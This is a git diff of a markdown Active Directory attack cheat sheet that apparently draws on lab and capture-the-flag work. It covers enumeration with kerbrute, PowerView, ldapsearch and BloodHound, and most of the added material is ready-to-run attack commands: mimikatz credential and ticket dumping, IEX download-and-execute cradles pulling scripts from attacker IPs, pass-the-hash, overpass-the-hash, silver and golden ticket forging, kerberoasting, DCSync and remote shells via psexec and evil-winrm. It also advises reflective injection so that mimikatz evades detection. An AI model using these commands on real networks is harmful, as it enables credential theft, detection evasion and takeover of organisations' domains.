@@ -1,15 +1,10 @@
-# Intro
+# AD Cheat Sheet
 
-## Notes
-* Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
-* Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
-* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+## Theory
 
+#### AD Structure
 
-
-## AD Structure
-
-* Domain Controller (DC) is a Windows Server containing  Active Directory Domain Services (AD DS)
+* Domain Controller (DC) is a Windows Server containing Active Directory Domain Services (AD DS)
 * AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
 * **NTDS.dit** is stored by default in %SystemRoot%\NTDS  
 ```
@@ -20,7 +15,7 @@ Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 * DC replicate updates from other domain controllers in the forest
 * DC Allows admin access to manage domain resources
 
-### Forest
+#### Forest
 * Forest: collection of one or more trees
 * Tree: collection of several domains with hierarchical order
 * Organizational Units (OUs): Containers for groups, computers, users, printers and other OUs
@@ -29,117 +24,37 @@ Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 * Domain Services: DNS Server, LLMNR, IPv6, MSSQL etc.
 * Domain Schema: Rules for object creation
 
-Example strucutre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.
+Example structre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.
 
-### Users
+#### Users
 
 Users are core of AD and DC's task is to manage access of those users to services.
 
-* Domain Admins: have ultimate control over the domain. They can access to the domain controller. If DA is compromised then NTDS.dit can be dumped using dsync attack.
+* Domain Admins (DA): have ultimate control over the domain. They can access to the domain controller. If DA is compromised then NTDS.dit can be dumped using dsync attack.
 * Service Accounts (can be also have Domain Admin rights): required by Windows for services such as SQL to pair a service with a service account. Some of them are associated with user accounts and have human-made passwords what makes them vulnerable to Kerberoasting attacks. 
 * Local Administrators: local machine administrators. Compromis of local admin can lead to ticket and credentials grabbing from local machine to impersonate other users and services in AD.
 * Domain Users: normal users. They can log into machines where they are authorized to. Users may be part of interesting groups that allows lateral movement once the user account is compromised.
 
-#### Bruteforce Users
-
-* Preferred way: kerbrute
-
-`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`
-
-* Nmap> sometimes crashes
-```
-nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spookysec.local', userdb=userlist.txt 10.10.43.76"
-```
-
-## Groups
+#### Groups
 
 * Security Groups: permissions users and services. Some groups have rights to change DACLs.
 * Distribution Groups: email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
 
-# Reconaissance
+## Active Directory Enumeration
 
-Understanding the target AD environment is key to further exploitation.
+### Manual Approach
 
+#### net.exe
 
-## Manual Discovery
+'net.exe' system utility is widely available and can be used once foothold on windows host within domain is obtained.
 
-* good practice is to use PowerView
+* `net user`
+* `net user /domain` returns a list of users to work with
+* `net user some_admin /domain` info about some_admin
+* `net group /domain`
+* `net accounts` lookup AD password policy
 
-```
-#get all computers in AD
-
-Get-NetComputer -fulldata | select cn
-
-# users
-
-Get-NetUser | select cn
-
-# groups 
-
-Get-NetGroup
-
-```
-
-* Using native tools:  
-
-```
-# Get Domain infos:  
-
-Get-ADDomain 
-
-# Get Forest infos:  
-
-Get-ADForest
-
-# AD user info: 
-
-Get-ADUser Administrator 
-
-# Important AD users:   
-
-Get-ADUser -Filter * | select SamAccountName 
-
-# Search for specific user:  
-
-Get-ADUser -Filter 'UserPrincipalName -like "user*"' 
-
-# Get all Users (including Computernames):  
-
-Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName 
-
-# Groups:   
-
-Get-ADGroup -Filter * | select SamAccountName  
-
-# AD Admins group:  
-
-Get-ADGroup "Domain Admins" -Properties members,memberof
-
-# Check trusted domains:  nltest /domain_trusts 
-
-# Get current active domain for the user:
-
- (Get-WmiObject Win32_ComputerSystem).Domain 
-
-# get SID
-
-Get-ADDomain | select DNSRoot, NetBIOSName, DomainSID 
-
-
-```
-
-* Helpful **Tools**:
-
-* crackmapexec
-* Rubeus
-* `enum4linux -a target_ip > enum.log`
-
-* AD recon: https://github.com/sense-of-security/ADRecon
-* Bloodhound: https://github.com/BloodHoundAD/BloodHound
-* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
-
-
-## Domain Controller Discovery
+#### Domain Controller Discovery
 For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located
 
 
@@ -147,18 +62,18 @@ For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-serv
 * **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local`
 * **Using nltest**: `nltest /dclist:domain.local`
 
-## Domain Hosts Discovery
+#### Domain Hosts Discovery
 
 * NetBios scan: `nbtscan 192.168.100.0/24`
 * LDAP query of domain base (credentials required): `ldapsearch -H ldap://dc.ip -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem" `
 * NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
 * Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)
 
-## Users discovery
+#### Users discovery
 
 `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`
 
-## Domain info dump with ldap
+#### Domain dump with ldap
 ```
  ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 
@@ -167,7 +82,75 @@ ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7Acl
 ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
 ```
 
-## Sniffing using Bloodhound
+
+
+### Tooling based Approach
+
+* Helpful **Tools**:
+
+* crackmapexec
+* `enum4linux -a target_ip > enum.log`
+
+* AD recon: https://github.com/sense-of-security/ADRecon
+* Bloodhound: https://github.com/BloodHoundAD/BloodHound
+* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
+
+
+#### Kerbrute
+
+* kerbrute
+
+`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`
+
+* Nmap
+```
+nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spookysec.local', userdb=userlist.txt 10.10.43.76"
+```
+
+#### PowerView
+
+* Poverview has a lot of built-in AD functionalities
+* So once a domain machine is compromised, upload and run powerview on it
+
+```powershell
+
+# download and execute commands
+
+IEX(New-Object Net.WebClient).downloadString('http://192.168.1.xxx/PowerView.ps1'); Get-NetComputer | select cn;
+
+
+```
+
+* Useful poverview commands
+
+``` powershell
+#get all computers in AD
+
+Get-NetComputer | select cn
+
+# users
+
+Get-NetUser | select cn
+
+# groups 
+
+Get-NetGroup
+```
+
+* It is important to find high value target users and where they are currently logged in to later compromise those machines and retrieve tickets or hashes.
+
+``` powershell
+# currently logged in users
+
+Get-NetLoggedon -ComputerName client251
+
+# active sessions to DC
+
+Get-NetSession -ComputerName dc01
+
+```
+
+### Bloodhound: AD Discovery
 
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 
@@ -198,16 +181,16 @@ use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
 
 `./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
 
-### Launching Bloodhound and AD Visualization
+#### Launching Bloodhound and AD Visualization
 
 1. launch neo4j: `sudo neo4j console`
 2. launch GUI: `bloodhound`
 3. click on Upload Data in the upper right corner
 4. Right-Click on free are on the screen and select "Reload Query"
 
-# Exploitation
+## Exploitation
 
-1. Try attacking Kerberos in this order:
+Try attacking AD in this order:
 Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 * Kerberos brute-force
@@ -218,9 +201,84 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 * Overpass the Hash
 * Pass the ticket
 * Silver ticket
-* Golden ticket
+* Distributed Component Object Model
+* Golden Ticket
+* Windows Management Instr: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
+* Powershell Remoting
 
-## Brute Force ASREP roast
+### Local Host Memmory Dumping
+
+Most of the AD attacks shall require hash or ticket that can be only extracted with SYSTEM rights from the target host.
+
+```powershell
+
+#engage the SeDebugPrivlege
+privilege::debug
+
+#dump the credentials of all logged-on users using the Sekurlsa
+sekurlsa::logonpasswords
+
+#dump tickets
+sekurlsa::tickets
+
+```
+
+
+```powershell
+# never use mimikatz as a standalone tool as it shall get detected
+# instead inject it into memmory using this module from ps mafia
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+
+```
+
+### Request Service Ticket
+
+If name of particular service is know, ticket can be requested for later attempting to crack its hash.
+
+```powershell 
+
+iex(New-Object Net.WebClient).DownloadString('http://192.168.119.181/Request_ST.ps1')
+
+#list all user tickets
+
+klist
+
+```
+
+* after this the service can be accessed 
+
+### Pass the Hash
+
+If hash is obtained from the memmory of compromised host, use it with pth-winexe kali tool
+
+```bash
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+```
+
+### Overpass the Hash
+
+This attack uses NTLM hash to obtain a TGT to gain further access
+
+```bash
+#use mimikatz to obtain powershell session as admin if NTLM hash is available
+
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+```
+
+* sometimes it is needed to authenticate with current session to obtain TGT
+
+`net use \\dc01`
+
+after that DC shall provide a TGT
+
+* use psexec to gain remote access
+
+`.\PsExec.exe \\dc01 cmd.exe`
+
+### Brute Force ASREP roast
 
 * To get user list of users use: `enum4linux`
 * If local access is give then use Rubeus: `Rubeus.exe asreproast`
@@ -252,13 +310,13 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 ```
 
 
-## Remote Shell
+### Remote Shell
 
 * RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
 * SMB: use some exploit from SMB cheat sheet
 
 
-## Generic All
+### Generic All
 
 If some user or group has "Generic All" Permission on any of the other objects than this object can be easily compromised.
 
@@ -311,7 +369,7 @@ smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
 source> https://cybergladius.com/htb-walkthrough-support/
 
 
-## Dsync Attack
+### Dsync Attack
 Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
 
 * Find accounts with permissions for DSync using **powerview**
@@ -337,7 +395,7 @@ PSexec can also be yused from windows client
 
 `.\PSExec.exe \\dc1.domain.com cmd`
 
-## Kerberoasting
+### Kerberoasting
 
 * If local access is give then use Rubeus: 
 
@@ -370,9 +428,8 @@ Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domai
 * And finally, crack the hash
 `hashcat -a 0 -m 13100 --force SPN.hash /wordlists/rockyou.txt`
 
-## Pass the Ticket
+### Pass the Ticket
 
-Short annotation of how it works follows:
 
 * dump TGT from LSASS
 * use TGT toact as domain admin by injecting it into current login sessions ID
@@ -398,8 +455,43 @@ Make kirbi ticket from BASE64 blob
 5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
 6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`
 
-## Silver Ticket
+### Silver Ticket
 Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets
+
+#### Mimikatz Workflow
+
+1. Obtain SID
+
+```powershell
+
+whoami /user
+
+# all numbebers before the relative identifier (last 4 numbers) are SID we need
+
+```
+
+
+2. Make Silver ticket
+```powershell
+
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::list
+
+# generate RC4 hashed password now with Rubeus, for instance
+
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+
+mimikatz # kerberos::list
+
+#finally launch cmd on behalf of impersonated service
+mimikatz # misc::cmd
+
+```
+
+
+#### Rubeus Workflow
 
 Typical workflow:
 1. Compromise some Computer within AD
@@ -407,11 +499,13 @@ Typical workflow:
 3. Forge NTLM hash RC4 (or better) for later use
 compromised password -> https://www.browserling.com/tools/ntlm-hash
 4. Forge ticket using rubeus:
-`Rubeus.exe silver /service:SQL/someDC:6565/SQL /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)
+`Rubeus.exe silver /service:SQL/dc1.local.com /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)
 
-## Golden Ticket
+Reference: https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
-### Mimikatz Golden Ticket
+### Golden Ticket
+
+#### Mimikatz Golden Ticket
 
 1. Dump SID and hash and inject it into memmory
 
@@ -436,7 +530,7 @@ Access anything without knowing the user
 `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
 
 
-## Hash cracking
+### Hash cracking
 
 
 * MsCacheV2
@@ -446,6 +540,9 @@ Access anything without knowing the user
 * NTLM
 
 `hashcat -a 0 -m 1000 admin.hashfile  /usr/share/wordlists/rockyou.txt --force --potfile-disable`
+
+### Distributed Component Object Model
+
 
 
 ## Dumping Credentials
@@ -516,3 +613,8 @@ Keyspace..: 14344385
 
 64f12cddaa88057e06a81b54e73b949b:Password1                
 
+
+## Additional Reading
+* Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
+* Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
